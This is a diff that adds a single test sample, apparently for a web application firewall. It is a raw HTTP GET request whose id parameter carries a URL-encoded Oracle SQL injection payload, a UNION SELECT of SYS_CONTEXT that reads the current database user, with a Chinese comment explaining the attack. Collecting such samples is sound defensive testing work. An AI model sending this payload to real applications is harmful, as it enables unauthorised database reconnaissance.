@@ -1,0 +1,9 @@
+# SQL注入_GET_oracle_普通注入-06506293
+# 攻击者基于UNION查询，将"union (select SYS_CONTEXT('USERENV','CURRENT_USER') from dual)"语句注入到 SQL 查询参数中，利用sys_context函数获取当前会话用户的名称信息。
+GET /?id=1%20union%20%28select%20SYS_CONTEXT%28%27USERENV%27%2C%27CURRENT_USER%27%29%20from%20dual%29%20&bid=hd_tag_m8mv2496 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2496
+RM-PRO-Token: fe6f8fcd4d646ccfdf5cc7880ebaa6f5
+RM-PRO-Time: 1742808369713
+User-Agent: curl/7.83.1
+
